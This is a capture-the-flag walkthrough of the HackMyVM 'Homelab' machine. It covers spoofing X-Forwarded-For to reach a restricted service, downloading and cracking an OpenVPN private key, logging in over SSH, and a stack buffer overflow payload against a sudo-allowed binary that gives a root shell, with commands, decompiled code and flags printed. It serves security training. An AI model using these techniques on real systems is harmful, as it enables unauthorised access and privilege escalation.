# Homelab

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.46:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.46

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Unix))
|_http-server-header: Apache/2.4.62 (Unix)
|_http-title: Mac OS X Server
|_http-favicon: Apache on Mac OS X
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
```
:::

## HTTP 

![writeup.png](/assets/pentest/hackmyvm/homelab/writeup.png)

```bash
└─$ feroxbuster -u http://homelab.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.txt,.html,.js -N 0,9
200      GET       96l      250w     3752c http://homelab.hmv/error.html
301      GET        9l       28w      308c http://homelab.hmv/style => http://homelab.hmv/style/
301      GET        9l       28w      309c http://homelab.hmv/script => http://homelab.hmv/script/
301      GET        9l       28w      310c http://homelab.hmv/service => http://homelab.hmv/service/
200      GET       75l      215w     2241c http://homelab.hmv/script/serverhome.js
200      GET      351l     1040w    98713c http://homelab.hmv/script/compressed_widgets.js
200      GET      412l     2178w   136171c http://homelab.hmv/script/compressed_libraries.js
200      GET      130l      376w     5435c http://homelab.hmv/
200      GET      130l      376w     5435c http://homelab.hmv/index.html
```

### Service

```bash
└─$ curl http://homelab.hmv/service/index.php -i
HTTP/1.1 200 OK
Date: Fri, 05 Sep 2025 18:09:51 GMT
Server: Apache/2.4.62 (Unix)
X-Powered-By: PHP/8.4.5
Content-Length: 59
Content-Type: text/plain;charset=UTF-8

Whoa! But sorry, this service is only available for myself! 
```

The most commonly used header to identify the connecting client is **X-Forwarded-For**
```bash
└─$ curl http://homelab.hmv/service/index.php -H 'X-Forwarded-For: 127.0.0.1'
Whoa! But sorry, this service is only available for myself!                                                                                                                                                       
└─$ curl http://homelab.hmv/service/index.php -H 'X-Forwarded-For: 10.0.2.46'
# Last modified by shinosawa
# on 2024-12-21

# Example Configuration File

client
dev tun
proto udp
remote ? ?
resolv-retry infinite
nobind
persist-key
persist-tun
ca ?
cert ?
# Regenerate a STRONG password for the KEY
# Do NOT use a SAME password as other services et. SSH
# it is DANGEROUS!
key ?
cipher AES-256-GCM
verb 3
```

This looks life **OpenVPN client configuration template**
```bash
client                 # Operates as a VPN client
dev tun                # Use a TUN device (layer 3 IP tunnel)
proto udp              # Transport protocol (UDP is default for OpenVPN)
remote ? ?             # VPN server address and port go here
resolv-retry infinite  # Keep retrying if DNS lookup or connection fails
nobind                 # Don’t bind to a fixed local port
persist-key            # Keep key across restarts
persist-tun            # Keep tunnel across restarts

ca ?                   # Path to CA certificate (provided by server admin)
cert ?                 # Path to client certificate
key ?                  # Path to client private key (needs a strong password!)
cipher AES-256-GCM     # Strong cipher for encryption
verb 3                 # Logging verbosity (3 = moderate)
```

### OpenVPN

```bash
└─$ feroxbuster -u http://homelab.hmv/service/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For: 10.0.2.46' --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .crt,.key,.ca -N 0,9
200      GET       21l       59w      326c http://homelab.hmv/service/
200      GET       20l       22w     1200c http://homelab.hmv/service/ca.crt
200      GET       84l      139w     4492c http://homelab.hmv/service/client.crt
200      GET       30l       36w     1862c http://homelab.hmv/service/client.key
200      GET       21l       59w      326c http://homelab.hmv/service/index.php
```

Download
```bash
curl http://homelab.hmv/service/ca.crt -Os
curl http://homelab.hmv/service/client.key -Os
curl http://homelab.hmv/service/client.crt -Os
```

Good, we have configuration but where do we connect 

**The default OpenVPN port is UDP port 1194**, which is the officially assigned IANA port for OpenVPN, though OpenVPN daemons can also be configured to use [TCP port 443](https://www.google.com/search?client=opera-gx&sca_esv=67db8545f6bda9c4&cs=0&sxsrf=AE3TifPGzNcrhT9Gk6bgkOQ4xJElOxMesA%3A1757096774920&q=TCP+port+443&sa=X&ved=2ahUKEwjO6tzIn8KPAxVczgIHHS1yAJEQxccNegQIAxAC&mstk=AUtExfBF5WDVcGiKj85co2rnA9sd0tch40h0N98BGT1aeK1D4VWBYH9c-1fBBm6Nwaf_3oCvzF2bOXNlCXE1es6opeJAGsueecn0yd__tdcOZKnnVFrgOPfz_ittW-3DETvJFk1EfwXFNz5J4JH8pdV26L4oJwNm19AdCzH060hbuZBXXy8xX1RrXicaQnwm8Se6pvAN-Tw4U5ttYEttiV_tv5wYFdO9jT5RDzHkFvgc9MgxCkFIoiNoycnltL3stZ6RravP72p0pu6XMAlD7V5QWKTNK6n09BaMd8s2h6zsQ-ZZxw&csui=3) to bypass restrictive firewalls that may block UDP 1194.

Great, it's open.
```bash
└─$ sudo nmap -p 1194 -sU homelab.hmv -T5
PORT     STATE SERVICE
1194/udp open  openvpn
```

Create config and connect using it. 
```bash
└─$ nano homelab.hmv.ovpn
client
dev tun
proto udp
remote homelab.hmv 1194

resolv-retry infinite
nobind
persist-key
persist-tun

ca ca.crt
cert client.crt
key client.key

cipher AES-256-GCM
verb 3

└─$ sudo openvpn homelab.hmv.ovpn
2025-09-05 14:30:06 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
2025-09-05 14:30:06 WARNING: file 'client.key' is group or others accessible
2025-09-05 14:30:06 OpenVPN 2.6.7 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2025-09-05 14:30:06 library versions: OpenSSL 3.5.0 8 Apr 2025, LZO 2.10
2025-09-05 14:30:06 DCO version: N/A
2025-09-05 14:30:06 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm for more info.
Enter Private Key Password: (press TAB for no echo)
```

```bash
└─$ pem2john client.key | tee client.key.hash
$PEM$1$1$723413125708285783c3bd80c53ff5e2$2048$54d32345749b18a8$1224$a365e1cc39ade15c08b3d6b6f9394253c07dc1fbf808aca85fa92a6e66c48f09d4b488d5ea8b9301da78db7abc68430ff6f20fa3f414be70007317e55acd09020f5c0cdf4c8b1d53ca035aaad88e9dfa1d13fa68c20dbe1c91f9f1bc9fdc2dbf2fd8bf132872e0f50506870040431c2fe38e96157a37f2be608dba52933771bd56fdb65afc3d648ad3d373768d684726722934be8cd7e0b68202459492b7d04c3996cb7d27bd21a507200eadd29375cef764a62385f27468102f9ebde5f58275e8fe46678a656f4aec0136b12895f6aa5cdaf4278056d101631257b4bb2ff36c9d2e1755f5021f2fdef5191c13eee7c93b4e069509e70f5f915ec817fc75fc4e5aad581f9c3473d75398282a857df2f314f4b84e2e4801b7e17c5415e781749ac7feaf540d894ead78180b95a6d451be4dcd5aca576d63dc11f7884636a03f5f9dd9e21907a25fdca36a173944649060f6c545c3c2b82a5d72e3a03bebbffacc0811d725b165422ee03aaac6b0ff27e8de7ea1331c4a56b3f84a92a0c53a263eaed4e2686d43c15330f8450238e916973802f89fb3e277b6e8dc6546b0c4220f395f951f0e76c3cd072f4ceabc4191c5407d0e305b4a553dc49cac8285548a0d28d2068315e838d607504623d48869c6b9c8a8ed6099bd64a81cdf5f579ee0c72c21c841f111c9a4f2a5ff3b3006a18743f8dd9527e052681fb0d56b8478965bb2267c2bddf5dc3dd37e966540947fdb7cbb06cb734d8c18cda94824afddb748ea13417b73f073754d233f3f5d70eae76f8ce707b414d5f9e45cce4052b6f3d55b43aa64c3c60da120f871ac750b779a81b147080fec7107a7b2114759af1c78ed8385207e50ed7dae417f110e956c85a7f695e094d55ac06157a8c4121b58dbee6fbe145a9a64af5baf875aaa6270413429e926e657fd861de336f5cf6deb8f815d34d205bb65f1d19886df1a7d7f450b62ceac410ebce33ec5c8beb9ec47991da96b8361d237ebcd5012b6fbb71a17fbbbab152d4c12bb7098c231b2390a819cb1ce7ef5087ad2470c653d224c39ee0b5a9ad593dd81cb9df7cae71c2573712e4eb756dbc7fc7f843de162b139d7dab37b638633fe4fb06c91fb7324b93ccbb4238f6c7193ea5a767011dfba4b22aadc09135edcad8218b3ae25a7c65ab87736805230c60a747dbeacbc70d829251c104dcce8ac2a917fedef7fca238b46fe21ec9337225e4be4bc604a054b108755d4b2d584bb1275d6005edf578f51a70cfc933762f9d1955f217da31a7e5c0339f36ed374a4f436e795c5a90746a9ba3f1db7c501ef7cf9f69586f35f50b5a622d11405ce93ee65ed57e52e80a5e509cd523cd6cacbb49a8acc27c7789eb85a0b371441ce799492685f9554ded46b023435c8386628a43419ade21a2037086a2904d8f8a88493f7c67f7dc553efd64fd24ca4703f7528d390b09cfb65cea026f6add846c2664b23e7ce3df356f24ab800bd627fd2291a176f8fad51eb28c8ba727ef9122cf67cedb1a2fafcabcb21d27de27a01ef0265d1854db36f60c48d35a45fe520361fcbce8609124144f9ab41ed09cfcb94c1f87405fd45b6d9903281793355d93c5a5dfa865b0336dcfec2f39db8b124a6edb32b0299f1d30fa1d350cbccf56b1f8dc2d5512b6b6dae685b4dd9a59a4db896b973dd6a7dbb40300785834347d6060077bf204ef954e78b0f821d9f8946c5c0613b9e
```

Looking into example hashes [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) `$PEM$1$` is `SHA1` format, however `crt` output showed `SHA256` instead! (Change `$1` to `$2`)
```bash
➜ .\hashcat.exe  -a 0 -m 24420 .\hashes.txt .\rockyou.txt
$PEM$2$1$7234131...:hiro
```

After starting OpenVPN with the provided config, a new `tun0` interface is created with the VPN IP `10.8.0.2`. The routing table shows normal internet traffic still goes through the local network (`eth0` → `10.0.2.1`), while VPN traffic uses `tun0` (`10.8.0.0/24`) and also has access to the internal subnet `10.176.13.0/24` via the VPN gateway `10.8.0.1`. Scanning that subnet with `fping` reveals an active host at `10.176.13.37`.
```bash
└─$ sudo openvpn homelab.hmv.ovpn &
└─$ ip -brief a s
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.0.2.15/24 fe80::c8d0:1e99:530b:fb94/64
tun0             UNKNOWN        10.8.0.2/24 fe80::f8c7:344c:dc10:b743/64
└─$ ip route
default via 10.0.2.1 dev eth0 proto dhcp src 10.0.2.15 metric 100
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100
10.8.0.0/24 dev tun0 proto kernel scope link src 10.8.0.2
10.176.13.0/24 via 10.8.0.1 dev tun0
└─$ fping -ag 10.176.13.0/24 2> /dev/null
10.176.13.37
```

`10.176.13.37` is the target itself, however we have access to SSH
```log
Open 10.176.13.37:80
Open 10.176.13.37:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.176.13.37

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 f7:f2:e0:96:c0:28:67:93:5f:90:f2:a1:86:73:74:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH+CjUSwYPHWSRaCoNKew8nMYY/85uXguTSqxBeMa63bM5IQgj6l27W1EHq3BKEKXohEWB7ekvxZ8LeDfFyrsag=
|   256 92:40:ba:b8:11:ad:79:41:71:f8:9e:00:01:64:9c:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBZmrtdcLvdq0gPyIp6dyJpObU2ysXjwyi1j6QfSDKhj
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Unix))
|_http-title: Mac OS X Server
|_http-server-header: Apache/2.4.62 (Unix)
|_http-favicon: Apache on Mac OS X
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
```

## SSH (Internal)

Use the potential username and password we got from OpenVPN

```bash
└─$ sshpass -p 'hiro' ssh shinosawa@homelab.local
Warning: Permanently added 'homelab.local' (ED25519) to the list of known hosts.

homelab:~$ id
uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)
```

### User.txt

```bash
homelab:~$ cat user.flag
flag{38665d1048af82499c6ecbd3c0db3acc}
```

## Privilege Escalation

```bash
homelab:~$ sudo -l
Matching Defaults entries for shinosawa on homelab:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for shinosawa:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User shinosawa may run the following commands on homelab:
    (ALL) NOPASSWD: /home/shinosawa/deepseek
```

No help menu or any indication that this is not a lazy binary.
```bash
homelab:~$ ./deepseek --help
>>> ^C
homelab:~$ ./deepseek -h
>>> ^C
homelab:~$ ./deepseek
>>> help
<think>
Emm, I'm so tired and don't want to answer any questions.
</think>

Thinking has stopped.
The server is busy, please try again later.
```

### BOF

Download and inspect
```bash
└─$ sshpass -p 'hiro' scp shinosawa@homelab.local:deepseek .
```

Looks like a classic overflow, we'll need to change return address of `vuln` function to `execute`

![writeup-1.png](/assets/pentest/hackmyvm/homelab/writeup-1.png)

Decompiled code translated to original looks like this (almost, not 100%)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Global message string
const char* message = 
    "<think>\n"
    "Emm, I'm so tired and don't want to answer any questions.\n"
    "</think>\n"
    "\n"
    "Thinking has stopped.\n"
    "The server is busy, please try again later.\n";

/**
 * Prints the message character by character with typewriter effect
 * Sleeps 50ms (50000 microseconds) between each character
 */
void typewriter_output() {
    size_t len = strlen(message);
    
    for (size_t i = 0; i < len; i++) {
        putchar(message[i]);
        fflush(stdout);
        usleep(50000);  // 50ms delay
    }
}

/**
 * Function that gets executed when buffer overflow occurs
 * Spawns a shell for the attacker
 */
void execute() {
    puts("[*] in execute()");
    fflush(stdout);
    
    puts("[*] running shell");
    fflush(stdout);
    
    // Execute shell
    execl("/bin/sh", "sh", NULL);
    
    // If execl fails
    perror("execl failed");
    exit(1);
}

/**
 * Vulnerable function with buffer overflow
 * Allocates 64-byte buffer but reads up to 256 bytes
 * This allows overwriting the return address on the stack
 */
void vuln() {
    char buffer[64];  // Only 64 bytes allocated
    
    printf(">>> ");
    fflush(stdout);
    
    // VULNERABILITY: reads up to 256 bytes into 64-byte buffer
    fgets(buffer, 256, stdin);
    
    // Always shows the "tired" message regardless of input
    typewriter_output();
}

/**
 * Main function - entry point
 */
int main(int argc, char* argv[]) {
    // Disable output buffering for immediate display
    setbuf(stdout, NULL);
    
    // Call the vulnerable function
    vuln();
    
    return 0;
}
```

Every protection is also disabled.
```bash
└─$ checksec --file deepseek
	Arch:       amd64-64-little   # 64-bit little-endian binary
	RELRO:      Full RELRO        # Read-only relocations fully enabled (harder GOT overwrite)
	Stack:      No canary found   # No stack canary, vulnerable to buffer overflows
	NX:         NX unknown        # No info, likely stack is executable (bad)
	PIE:        No PIE (0x400000) # Not position-independent, fixed load address
	Stack:      Executable        # Stack is executable (very insecure)
	RWX:        Has RWX segments  # Memory segment is both writable + executable
	Stripped:   No                # Symbol names preserved (easier to reverse engineer)
	Debuginfo:  Yes               # Includes debug info, very useful for analysis
```

```bash
# Find address
└─$ gdb ./deepseek
pwndbg> info functions
...
0x00000000004011fd  typewriter_output
0x0000000000401266  execute            # Target return address
0x00000000004012e2  vuln
0x0000000000401332  main

# Generate payload
pwndbg> cyclic 400
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaab
# Crash the program (overflow buffer with too much data)
pwndbg> run
Starting program: /home/woyag/Desktop/Rooms/HackMyVM/Homelab/deepseek
>>> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaab
<think>
...
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
*RAX  0x8e
*RBX  1
*RCX  0x59ff092d71647360
*RDX  0xff010101000300
*RDI  0x402000 ◂— "<think>\nEmm, I'm so tired and don't want to answer any questions.\n</think>\n\nThinking has stopped.\nThe server is busy, please try again later.\n"
*RSI  0x8080808080808080
*R8   0xfefefefefefefeff
 R9   0
 R10  0
*R11  0x246
*R12  0x401332 (main) ◂— push rbp
*R13  0x7fffffffdc48 ◂— 'vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaa'
 R14  0
*R15  0x7fffffffde48 ◂— 0x21 /* '!' */
*RBP  0x6161616161616169 ('iaaaaaaa') # <-- Overflowed return address
*RSP  0x7fffffffdbe8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaa...'
*RIP  0x401331 (vuln+79) ◂— ret
────────────────────────────────────────────
pwndbg> cyclic -l iaaaaaaa
Finding cyclic pattern of 8 bytes: b'iaaaaaaa' (hex: 0x6961616161616161)
Found at offset 64
```

```bash
# Payload = 64 bytes padding + 8 bytes RBP + 8 bytes return address
homelab:~$ python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*64 + b"B"*8 + struct.pack("<Q", 0x401266))' | sudo ./deepseek
>>> <think>
Emm, I'm so tired and don't want to answer any questions.
</think>

Thinking has stopped.
The server is busy, please try again later.
[*] in execute()
[*] running shell
```

The payload has worked successfully, yet the program exists without shell access.

Now we need some kind of **handle** to catch the shell before it exits, the simplest trick is using STDIN or cat.

It's simple and also wanky
```bash
homelab:~$ (python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*64 + b"B"*8 + struct.pack("<Q", 0x401266))'; cat) | sudo ./deepseek
>>> whatever # Anything to move with program
whatever     # Anything to move with program
<think>
Emm, I'm so tired and don't want to answer any questions.
</think>

Thinking has stopped.
The server is busy, please try again later.
[*] in execute()
[*] running shell
id # Command to execute
id # Command to execute PLEASE
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Root.txt

```bash
> ls -alh /root # Enter twice
total 12K
drwx------    2 root     root        4.0K Apr 17 13:43 .
drwxr-xr-x   21 root     root        4.0K Apr 17 13:59 ..
lrwxrwxrwx    1 root     root           9 Apr 15 22:58 .ash_history -> /dev/null
-rwx------    1 root     root          39 Apr 17 13:43 root.flag
> cat /root/root.flag # Enter twice
flag{e3b081b8af1c7079049b029c7cb8bd0d}
```

